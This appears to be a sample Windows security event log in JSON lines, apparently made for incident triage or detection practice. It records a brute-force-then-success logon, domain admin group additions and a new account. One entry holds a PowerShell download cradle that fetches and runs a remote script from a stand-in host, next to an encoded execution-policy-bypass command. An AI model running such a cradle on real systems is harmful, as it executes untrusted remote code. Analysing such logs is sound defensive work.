{"event_id":4625,"timestamp":"2026-06-06T08:01:10Z","log_name":"Security","hostname":"DC-01","username":"j.smith","source_ip":"203.0.113.44","process_name":"-","command_line":"-","target_user":"j.smith","group_name":"-","status":"failed","message":"An account failed to log on."}
{"event_id":4625,"timestamp":"2026-06-06T08:01:34Z","log_name":"Security","hostname":"DC-01","username":"j.smith","source_ip":"203.0.113.44","process_name":"-","command_line":"-","target_user":"j.smith","group_name":"-","status":"failed","message":"An account failed to log on."}
{"event_id":4625,"timestamp":"2026-06-06T08:02:02Z","log_name":"Security","hostname":"DC-01","username":"j.smith","source_ip":"203.0.113.44","process_name":"-","command_line":"-","target_user":"j.smith","group_name":"-","status":"failed","message":"An account failed to log on."}
{"event_id":4625,"timestamp":"2026-06-06T08:02:41Z","log_name":"Security","hostname":"DC-01","username":"j.smith","source_ip":"203.0.113.44","process_name":"-","command_line":"-","target_user":"j.smith","group_name":"-","status":"failed","message":"An account failed to log on."}
{"event_id":4625,"timestamp":"2026-06-06T08:03:15Z","log_name":"Security","hostname":"DC-01","username":"j.smith","source_ip":"203.0.113.44","process_name":"-","command_line":"-","target_user":"j.smith","group_name":"-","status":"failed","message":"An account failed to log on."}
{"event_id":4624,"timestamp":"2026-06-06T08:03:59Z","log_name":"Security","hostname":"DC-01","username":"j.smith","source_ip":"203.0.113.44","process_name":"-","command_line":"-","target_user":"j.smith","group_name":"-","status":"success","message":"An account was successfully logged on."}
{"event_id":4688,"timestamp":"2026-06-06T09:12:21Z","log_name":"Security","hostname":"HR-WS-022","username":"a.johnson","source_ip":"-","process_name":"powershell.exe","command_line":"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=","target_user":"-","group_name":"-","status":"success","message":"A new process has been created."}
{"event_id":4104,"timestamp":"2026-06-06T09:12:24Z","log_name":"Microsoft-Windows-PowerShell/Operational","hostname":"HR-WS-022","username":"a.johnson","source_ip":"-","process_name":"powershell.exe","command_line":"IEX (New-Object Net.WebClient).DownloadString('hxxp://example-update.local/a.ps1')","target_user":"-","group_name":"-","status":"success","message":"PowerShell script block logging captured suspicious download cradle."}
{"event_id":4732,"timestamp":"2026-06-06T10:44:08Z","log_name":"Security","hostname":"DC-01","username":"admin.temp","source_ip":"10.10.5.20","process_name":"-","command_line":"-","target_user":"m.chen","group_name":"Administrators","status":"success","message":"A member was added to a security-enabled local group."}
{"event_id":4728,"timestamp":"2026-06-06T10:47:33Z","log_name":"Security","hostname":"DC-01","username":"admin.temp","source_ip":"10.10.5.20","process_name":"-","command_line":"-","target_user":"m.chen","group_name":"Domain Admins","status":"success","message":"A member was added to a security-enabled global group."}
{"event_id":4625,"timestamp":"2026-06-06T11:20:16Z","log_name":"Security","hostname":"VPN-01","username":"r.patel","source_ip":"198.51.100.88","process_name":"-","command_line":"-","target_user":"r.patel","group_name":"-","status":"failed","message":"An account failed to log on."}
{"event_id":4624,"timestamp":"2026-06-06T11:22:47Z","log_name":"Security","hostname":"VPN-01","username":"r.patel","source_ip":"198.51.100.88","process_name":"-","command_line":"-","target_user":"r.patel","group_name":"-","status":"success","message":"An account was successfully logged on."}
{"event_id":4688,"timestamp":"2026-06-06T12:05:39Z","log_name":"Security","hostname":"FIN-LAPTOP-014","username":"j.smith","source_ip":"-","process_name":"notepad.exe","command_line":"notepad.exe C:\\Users\\j.smith\\notes.txt","target_user":"-","group_name":"-","status":"success","message":"A new process has been created."}
{"event_id":4720,"timestamp":"2026-06-06T13:18:04Z","log_name":"Security","hostname":"DC-01","username":"helpdesk01","source_ip":"10.10.4.15","process_name":"-","command_line":"-","target_user":"contractor.audit","group_name":"-","status":"success","message":"A user account was created."}
